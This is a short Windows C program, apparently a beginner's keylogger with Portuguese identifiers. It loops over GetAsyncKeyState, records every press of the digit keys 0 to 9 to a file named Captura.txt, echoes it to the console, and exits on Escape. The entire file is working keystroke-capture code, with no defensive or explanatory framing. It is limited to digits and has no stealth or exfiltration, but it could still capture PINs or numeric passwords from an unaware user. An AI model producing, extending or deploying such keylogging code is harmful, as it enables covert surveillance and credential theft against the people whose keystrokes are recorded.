#include <windows.h>
#include <stdio.h>

#define PRESSED -32767

int main()
{
    int result,teclas;
    int index = 0;
    FILE *arquivo;

    arquivo = fopen("Captura.txt","w");

    while(1) {
        if(GetAsyncKeyState(27) == PRESSED) break;

        for(teclas = 48; teclas <= 57; teclas++) {
            Sleep(1);

            result = GetAsyncKeyState(teclas);

            if(result == PRESSED) {
                fprintf(arquivo,"%c",teclas);
                printf_s("%c", teclas);
            }
        }
    }

    return 0;
}